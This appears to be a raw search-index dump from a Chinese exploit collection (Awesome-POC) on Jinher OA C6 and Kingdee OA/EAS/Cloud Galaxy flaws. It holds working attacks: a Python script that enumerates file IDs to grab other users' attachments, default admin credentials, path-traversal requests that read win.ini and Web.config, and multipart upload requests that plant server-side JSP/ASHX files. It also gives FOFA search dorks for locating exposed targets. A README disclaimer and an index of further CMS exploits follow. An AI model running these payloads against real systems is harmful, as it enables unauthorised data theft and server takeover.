","date":"0001-01-01","objectID":"/%E9%87%91%E5%92%8Coa-c6-openfile.aspx-%E5%90%8E%E5%8F%B0%E8%B6%8A%E6%9D%83%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E9%87%91%E5%92%8Coa-c6-openfile.aspx-%E5%90%8E%E5%8F%B0%E8%B6%8A%E6%9D%83%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 金和OA C6 存在后台越权敏感文件遍历漏洞，普通用户通过遍历特殊参数可以获取其他用户上传的敏感文件 ","date":"0001-01-01","objectID":"/%E9%87%91%E5%92%8Coa-c6-openfile.aspx-%E5%90%8E%E5%8F%B0%E8%B6%8A%E6%9D%83%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E9%87%91%E5%92%8Coa-c6-openfile.aspx-%E5%90%8E%E5%8F%B0%E8%B6%8A%E6%9D%83%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 金和OA C6 ","date":"0001-01-01","objectID":"/%E9%87%91%E5%92%8Coa-c6-openfile.aspx-%E5%90%8E%E5%8F%B0%E8%B6%8A%E6%9D%83%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E9%87%91%E5%92%8Coa-c6-openfile.aspx-%E5%90%8E%E5%8F%B0%E8%B6%8A%E6%9D%83%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"Jinher-OA\" ","date":"0001-01-01","objectID":"/%E9%87%91%E5%92%8Coa-c6-openfile.aspx-%E5%90%8E%E5%8F%B0%E8%B6%8A%E6%9D%83%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E9%87%91%E5%92%8Coa-c6-openfile.aspx-%E5%90%8E%E5%8F%B0%E8%B6%8A%E6%9D%83%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 默认用户口令：admin/000000 登录后点击信息交流，发起协同页面 上传附件并上传发送给目标 这里登录权限为管理员，我们自己发给自己就好，前文只是展现漏洞挖掘思路过程 成功收到上传的附件 点击查看时抓包，发现一个带有文件ID的请求包 返回了几个参数 var strFilePath = '../Resource/slaves/1/8b473ecb-7b39-4384-ada2-b0ec72c4f6ed.png'; var strFileType = 'png'; var strSid='3jvpvhs410m2wdbbficax5q5'; var strFileIDCode='us9w7xWE7do='; var strId = '1229'; var strTxtReg = 'txt,ini,xml,config,htm,html,js,css,asp,aspx,jsp,cs,sql,inf,htc,log'; var strImgReg = 'jpg,gif,jpeg,png,ico'; var MD = ''; 其中我们注意到 strFilePath 为文件的存储地址，我们更改 id参数为另一个值，且测试后发现 name文件名参数无关紧要 更改ID后发送请求包发现获得另一个文件的信息 访问Url，注意 type参数 需要为正确的文件后缀才可以访问 http://xxx.xxx.xxx.xxx/C6/control/OpenFile.aspx?id=1200\u0026name=\u0026type=pdf 这里更换一个普通用户测试是否可行，尝试遍历 id 存在 strFilePath参数 则是存在文件，为空则是文件已经不存在 同时抓包下载文件页面也可以看到可获取的参数 FileID 与 FileIDCode 于是只需要通过刚刚的ID遍历，获取两个关键参数就能下载其他人发送的敏感文件，且只需要普通用户权限 ","date":"0001-01-01","objectID":"/%E9%87%91%E5%92%8Coa-c6-openfile.aspx-%E5%90%8E%E5%8F%B0%E8%B6%8A%E6%9D%83%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E9%87%91%E5%92%8Coa-c6-openfile.aspx-%E5%90%8E%E5%8F%B0%E8%B6%8A%E6%9D%83%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞POC POC只检测是否存在漏洞，且漏洞存在于后台需要登录 运行后访问链接即可下载文件 import requests import sys import random import re import base64 import time from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: 金和OA C6 \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl \u003e\u003e\u003e http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url, file_id, cookie): vuln_url = target_url + \"/C6/control/OpenFile.aspx?id={}\u0026name=\u0026type=pdf\".format(file_id) headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\", \"Cookie\":cookie } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) print(\"\\033[36m[o] 正在请求 Url: {}\\033[0m\".format(vuln_url)) if \"strFilePath =\" in response.text and response.status_code == 200: strFilePath = re.findall(r\"var strFilePath = '(.*?)';\", response.text)[0] strFileType = strFilePath[-3:] strFileIDCode = re.findall(r\"var strFileIDCode='(.*?)';\", response.text)[0] strId = re.findall(r\"var strId = '(.*?)';\", response.text)[0] sid = re.findall(r'ASP.NET_SessionId=(.*?);', cookie)[0] if strFilePath != \"\": print(\"\\033[36m[o] 目标 {} 存在漏洞, 获取文件信息:\\n[o] 文件路径：{}\\n[o] 文件类型：{}\\n[o] 文件ID code：{}\\n[o] 文件编号： {}\\033[0m\".format(target_url, strFilePath, strFileType,strFileIDCode, strId )) print(\"\\033[32m[o] 文件下载链接为: {}/C6/JHSoft.Web.CustomQuery/uploadFileDownLoad.aspx?Decrypt=\u0026FileID={}\u0026FileIDCode={}\u0026sid={}\".format(target_url, strId, strFileIDCode, sid)) else: print(\"\\033[31m[x] 目标 {} 文件不存在 \\033[0m\".format(target_url)) else: print(\"\\033[31m[x] 目标 {} 不存在漏洞 \\033[0m\".format(target_url)) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl \u003e\u003e\u003e \\033[0m\")) file_id = str(input(\"\\033[35mFile_id \u003e\u003e\u003e \\033[0m\")) cookie = str(input(\"\\033[35mCookie \u003e\u003e\u003e \\033[0m\")) POC_1(target_url, file_id, cookie) ","date":"0001-01-01","objectID":"/%E9%87%91%E5%92%8Coa-c6-openfile.aspx-%E5%90%8E%E5%8F%B0%E8%B6%8A%E6%9D%83%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/:5:0","tags":null,"title":"","uri":"/%E9%87%91%E5%92%8Coa-c6-openfile.aspx-%E5%90%8E%E5%8F%B0%E8%B6%8A%E6%9D%83%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"金蝶OA Apusic应用服务器(中间件) server_file 目录遍历漏洞 ","date":"0001-01-01","objectID":"/%E9%87%91%E8%9D%B6oa-apusic%E5%BA%94%E7%94%A8%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%AD%E9%97%B4%E4%BB%B6-server_file-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E9%87%91%E8%9D%B6oa-apusic%E5%BA%94%E7%94%A8%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%AD%E9%97%B4%E4%BB%B6-server_file-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 金蝶OA Apusic应用服务器(中间件) 存在任意文件读取漏洞，攻击者通过漏洞可以获取目录下的文件信息 ","date":"0001-01-01","objectID":"/%E9%87%91%E8%9D%B6oa-apusic%E5%BA%94%E7%94%A8%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%AD%E9%97%B4%E4%BB%B6-server_file-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E9%87%91%E8%9D%B6oa-apusic%E5%BA%94%E7%94%A8%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%AD%E9%97%B4%E4%BB%B6-server_file-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 金蝶OA 9.0 Apusic应用服务器(中间件) ","date":"0001-01-01","objectID":"/%E9%87%91%E8%9D%B6oa-apusic%E5%BA%94%E7%94%A8%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%AD%E9%97%B4%E4%BB%B6-server_file-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E9%87%91%E8%9D%B6oa-apusic%E5%BA%94%E7%94%A8%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%AD%E9%97%B4%E4%BB%B6-server_file-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"Apusic-公司产品\" \u0026\u0026 title==\"欢迎使用Apusic应用服务器\" ","date":"0001-01-01","objectID":"/%E9%87%91%E8%9D%B6oa-apusic%E5%BA%94%E7%94%A8%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%AD%E9%97%B4%E4%BB%B6-server_file-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E9%87%91%E8%9D%B6oa-apusic%E5%BA%94%E7%94%A8%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%AD%E9%97%B4%E4%BB%B6-server_file-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面 验证POC /admin/protected/selector/server_file/files?folder=/ ","date":"0001-01-01","objectID":"/%E9%87%91%E8%9D%B6oa-apusic%E5%BA%94%E7%94%A8%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%AD%E9%97%B4%E4%BB%B6-server_file-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E9%87%91%E8%9D%B6oa-apusic%E5%BA%94%E7%94%A8%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%AD%E9%97%B4%E4%BB%B6-server_file-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"金蝶OA EAS系统 uploadLogo.action 任意文件上传漏洞 ","date":"0001-01-01","objectID":"/%E9%87%91%E8%9D%B6oa-eas%E7%B3%BB%E7%BB%9F-uploadlogo.action-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E9%87%91%E8%9D%B6oa-eas%E7%B3%BB%E7%BB%9F-uploadlogo.action-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 金蝶 EAS 及 EAS Cloud 是金蝶软件公司推出的一套企业级应用软件套件，旨在帮助企业实现全面的管理和业务流程优化。金蝶 EAS 及 EAS Cloud 在 uploadLogo.action 存在文件上传漏洞，攻击者可以利用文件上传漏洞执行恶意代码、写入后门、读取敏感文件，从而可能导致服务器受到攻击并被控制。 ","date":"0001-01-01","objectID":"/%E9%87%91%E8%9D%B6oa-eas%E7%B3%BB%E7%BB%9F-uploadlogo.action-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E9%87%91%E8%9D%B6oa-eas%E7%B3%BB%E7%BB%9F-uploadlogo.action-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 金蝶OA EAS系统 ","date":"0001-01-01","objectID":"/%E9%87%91%E8%9D%B6oa-eas%E7%B3%BB%E7%BB%9F-uploadlogo.action-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E9%87%91%E8%9D%B6oa-eas%E7%B3%BB%E7%BB%9F-uploadlogo.action-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 \"/easportal/\" ","date":"0001-01-01","objectID":"/%E9%87%91%E8%9D%B6oa-eas%E7%B3%BB%E7%BB%9F-uploadlogo.action-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E9%87%91%E8%9D%B6oa-eas%E7%B3%BB%E7%BB%9F-uploadlogo.action-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登陆页面 poc POST /plt_portal/setting/uploadLogo.action HTTP/1.1 Host: User-Agent: Mozilla/5.0 (Macintosh;T2lkQm95X0c= Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Accept-Encoding: gzip Content-Type: multipart/form-data; boundary=----WebKitFormBoundarycxkT8bV6WLIUzm2p ------WebKitFormBoundarycxkT8bV6WLIUzm2p Content-Disposition: form-data; name=\"chooseLanguage_top\" ch ------WebKitFormBoundarycxkT8bV6WLIUzm2p Content-Disposition: form-data; name=\"dataCenter\" xx ------WebKitFormBoundarycxkT8bV6WLIUzm2p Content-Disposition: form-data; name=\"insId\" ------WebKitFormBoundarycxkT8bV6WLIUzm2p Content-Disposition: form-data; name=\"type\" top ------WebKitFormBoundarycxkT8bV6WLIUzm2p Content-Disposition: form-data; name=\"upload\"; filename=\"text.jsp\" Content-Type: image/jpeg Test ------WebKitFormBoundarycxkT8bV6WLIUzm2p-- /portal/res/file/upload/xxx.jsp ","date":"0001-01-01","objectID":"/%E9%87%91%E8%9D%B6oa-eas%E7%B3%BB%E7%BB%9F-uploadlogo.action-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E9%87%91%E8%9D%B6oa-eas%E7%B3%BB%E7%BB%9F-uploadlogo.action-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"金蝶OA server_file 目录遍历漏洞 ","date":"0001-01-01","objectID":"/%E9%87%91%E8%9D%B6oa-server_file-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E9%87%91%E8%9D%B6oa-server_file-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 金蝶OA server_file 存在目录遍历漏洞，攻击者通过目录遍历可以获取服务器敏感信息 ","date":"0001-01-01","objectID":"/%E9%87%91%E8%9D%B6oa-server_file-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E9%87%91%E8%9D%B6oa-server_file-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 金蝶OA ","date":"0001-01-01","objectID":"/%E9%87%91%E8%9D%B6oa-server_file-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E9%87%91%E8%9D%B6oa-server_file-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"Kingdee-EAS\" ","date":"0001-01-01","objectID":"/%E9%87%91%E8%9D%B6oa-server_file-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E9%87%91%E8%9D%B6oa-server_file-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录界面为 漏洞POC /appmonitor/protected/selector/server_file/files?folder=/\u0026suffix= # Windows服务器 appmonitor/protected/selector/server_file/files?folder=C://\u0026suffix= # Linux服务器 appmonitor/protected/selector/server_file/files?folder=/\u0026suffix= ","date":"0001-01-01","objectID":"/%E9%87%91%E8%9D%B6oa-server_file-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E9%87%91%E8%9D%B6oa-server_file-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"金蝶OA 云星空 CommonFileServer 任意文件读取漏洞 ","date":"0001-01-01","objectID":"/%E9%87%91%E8%9D%B6oa-%E4%BA%91%E6%98%9F%E7%A9%BA-commonfileserver-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E9%87%91%E8%9D%B6oa-%E4%BA%91%E6%98%9F%E7%A9%BA-commonfileserver-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 金蝶OA 云星空 CommonFileServer接口存在任意文件读取漏洞，攻击者通过漏洞可以获取服务器中的敏感文件，进一步攻击服务器 ","date":"0001-01-01","objectID":"/%E9%87%91%E8%9D%B6oa-%E4%BA%91%E6%98%9F%E7%A9%BA-commonfileserver-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E9%87%91%E8%9D%B6oa-%E4%BA%91%E6%98%9F%E7%A9%BA-commonfileserver-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 金蝶OA 云星空 ","date":"0001-01-01","objectID":"/%E9%87%91%E8%9D%B6oa-%E4%BA%91%E6%98%9F%E7%A9%BA-commonfileserver-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E9%87%91%E8%9D%B6oa-%E4%BA%91%E6%98%9F%E7%A9%BA-commonfileserver-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"金蝶云星空-管理中心\" ","date":"0001-01-01","objectID":"/%E9%87%91%E8%9D%B6oa-%E4%BA%91%E6%98%9F%E7%A9%BA-commonfileserver-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E9%87%91%E8%9D%B6oa-%E4%BA%91%E6%98%9F%E7%A9%BA-commonfileserver-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登陆页面 验证POC /CommonFileServer/c%3a%2fwindows%2fwin.ini /CommonFileServer/C%3A%5CProgram%20Files%20%28x86%29%5CKingdee%5CK3Cloud%5CWebSite%5CWeb.config ","date":"0001-01-01","objectID":"/%E9%87%91%E8%9D%B6oa-%E4%BA%91%E6%98%9F%E7%A9%BA-commonfileserver-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E9%87%91%E8%9D%B6oa-%E4%BA%91%E6%98%9F%E7%A9%BA-commonfileserver-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"金蝶OA 云星空 ScpSupRegHandler 任意文件上传漏洞 ","date":"0001-01-01","objectID":"/%E9%87%91%E8%9D%B6oa-%E4%BA%91%E6%98%9F%E7%A9%BA-scpsupreghandler-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E9%87%91%E8%9D%B6oa-%E4%BA%91%E6%98%9F%E7%A9%BA-scpsupreghandler-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 金蝶OA 云星空 ScpSupRegHandler 接口存在任意文件上传漏洞，攻击者通过漏洞可以上传任意文件获取服务器权限 ","date":"0001-01-01","objectID":"/%E9%87%91%E8%9D%B6oa-%E4%BA%91%E6%98%9F%E7%A9%BA-scpsupreghandler-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E9%87%91%E8%9D%B6oa-%E4%BA%91%E6%98%9F%E7%A9%BA-scpsupreghandler-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 金蝶OA 云星空 ","date":"0001-01-01","objectID":"/%E9%87%91%E8%9D%B6oa-%E4%BA%91%E6%98%9F%E7%A9%BA-scpsupreghandler-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E9%87%91%E8%9D%B6oa-%E4%BA%91%E6%98%9F%E7%A9%BA-scpsupreghandler-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"金蝶云星空-管理中心\" ","date":"0001-01-01","objectID":"/%E9%87%91%E8%9D%B6oa-%E4%BA%91%E6%98%9F%E7%A9%BA-scpsupreghandler-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E9%87%91%E8%9D%B6oa-%E4%BA%91%E6%98%9F%E7%A9%BA-scpsupreghandler-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登陆页面 poc POST /k3cloud/SRM/ScpSupRegHandler HTTP/1.1 Host: Accept-Encoding: identity Content-Length: 973 Accept-Language: zh-CN,zh;q=0.8 Accept: */* Cache-Control: max-age=0 Content-Type: multipart/form-data; boundary=2ac719f8e29343df94aa4ab49e456061 --2ac719f8e29343df94aa4ab49e456061 Content-Disposition: form-data; name=\"dbId_v\" . --2ac719f8e29343df94aa4ab49e456061 Content-Disposition: form-data; name=\"FID\" 2022 --2ac719f8e29343df94aa4ab49e456061 Content-Disposition: form-data; name=\"FAtt\"; filename=\"../../../../uploadfiles/test.ashx.\" Content-Type: text/plain \u003c%@ WebHandler Language=\"C#\" Class=\"TestHandler\" %\u003e using System; using System.Web; public class TestHandler : IHttpHandler { public void ProcessRequest (HttpContext context) { context.Response.ContentType= \"text/plain\"; context.Response.Write(\"Test\"); } public bool IsReusable { get {return false; } } } --2ac719f8e29343df94aa4ab49e456061-- /K3Cloud/uploadfiles/Test.ashx ","date":"0001-01-01","objectID":"/%E9%87%91%E8%9D%B6oa-%E4%BA%91%E6%98%9F%E7%A9%BA-scpsupreghandler-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E9%87%91%E8%9D%B6oa-%E4%BA%91%E6%98%9F%E7%A9%BA-scpsupreghandler-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"Awesome-POC 【免责声明】本项目所涉及的技术、思路和工具仅供学习，任何人不得将其用于非法用途和盈利，不得将其用于非授权渗透测试，否则后果自行承担，与本项目无关。使用本项目前请先阅读 法律法规 。 ","date":"0001-01-01","objectID":"/readme/:0:0","tags":null,"title":"","uri":"/readme/"},{"categories":null,"content":"0x01 项目导航 CHECKLIST Nacos 漏洞 Checklist SmartBi 漏洞 Checklist 安全设备漏洞 Checklist CMS漏洞 74cms v4.2.1 v4.2.129 后台getshell漏洞 74cms v5.0.1 后台跨站请求伪造漏洞 CVE-2019-11374 Anchor CMS 0.12.7 跨站请求伪造 CVE-2020-23342 AspCMS commentList.asp SQL注入漏洞 BloofoxCMS 0.5.2.1 存储型XSS BSPHP index.php 未授权访问 信息泄露漏洞 CmsEasy crossall_act.php SQL注入漏洞 CmsEasy language_admin.php 后台命令执行漏洞 CmsEasy update_admin.php 后台任意文件上传漏洞 CxCMS Resource.ashx 任意文件读取漏洞 DedeCMS common.func.php 远程命令执行漏洞 Discuz 3.4 最新版后台getshell Discuz!X 3.4 admincp_setting.php 后台SQL注入漏洞 Discuz!X3.4 后台修改UCenter配置getshell漏洞 DocCMS keyword SQL注入漏洞 emlog widgets.php 后台SQL注入漏洞 ezEIP 4.1.0 信息泄露漏洞 Fuel CMS 1.4.1 远程代码执行漏洞 Joomla 目录遍历及远程代码执行漏洞 CVE-2021-23132 JunAms内容管理系统文件上传漏洞 CNVD-2020-24741 Ke361 AuthManagerController.class.php 后台SQL注入漏洞 Ke361 DistrictController.class.php 后台SQL注入漏洞 CNVD-2021-25002 Ke361 GoodsController.class.php SSRF漏洞 Ke361 MenuController.class.php 后台SQL注入漏洞 CNVD-2021-25002 Ke361 TopicController.class.php SQL注入漏洞 CNVD-2017-04380 OKLite 1.2.25 后台插件安装 任意文件上传 OKLite 1.2.25 后台模块导入 任意文件上传 CVE-2019-16131 OKLite 1.2.25 后台风格模块 任意文件删除 CVE-2019-16132 OneBlog 开源博客管理系统 远程命令执行漏洞 OpenSNS Application ShareController.class.php 远程命令执行漏洞 OpenSNS AuthorizeController.class.php 后台远程命令执行漏洞 OpenSNS ChinaCityController.class.php SQL注入漏洞 OpenSNS CurlModel.class.php SSRF漏洞 OpenSNS ThemeController.class.php 后台任意文件上传漏洞 OpenSNS ThemeController.class.php 后台任意文件下载漏洞 Pb-CMS Shiro默认密钥 远程命令执行漏洞 PbootCMS domain SQL注入漏洞 PbootCMS ext_price SQL注入漏洞 PbootCMS search SQL注入漏洞 PbootCMS V3.1.2 正则绕过 RCE 漏洞 PigCMS action_flashUpload 任意文件上传漏洞 ShopXO download 任意文件读取漏洞 CNVD-2021-15822 TypesetterCMS 后台任意文件上传 UCMS 文件上传漏洞 CVE-2020-25483 WeiPHP3.0 session_id 任意文件上传漏洞 WeiPHP5.0 bind_follow SQL注入漏洞 WeiPHP5.0 download_imgage 前台文件任意读取 CNVD-2020-68596 WeiPHP5.0 任意用户Cookie伪造 CNVD-2021-09693 YzmCMS Version 小于V5.8正式版 后台采集模块 SSRF漏洞 ZZZCMS parserSearch 远程命令执行漏洞 华宜互联 硬编码超级管理员漏洞 原创先锋 后台管理平台 未授权访问漏洞 发货100 M_id SQL注入漏洞 CNVD-2021-30193 快排CMS Socket.php 日志信息泄露漏洞 快排CMS 后台XSS漏洞 快排CMS 后台任意文件上传漏洞 极致CMS 1.81 后台存储型XSS 极致CMS alipay_return_pay SQL注入漏洞 极致CMS 后台文件编辑插件 任意文件上传 狮子鱼CMS ApiController.class.php 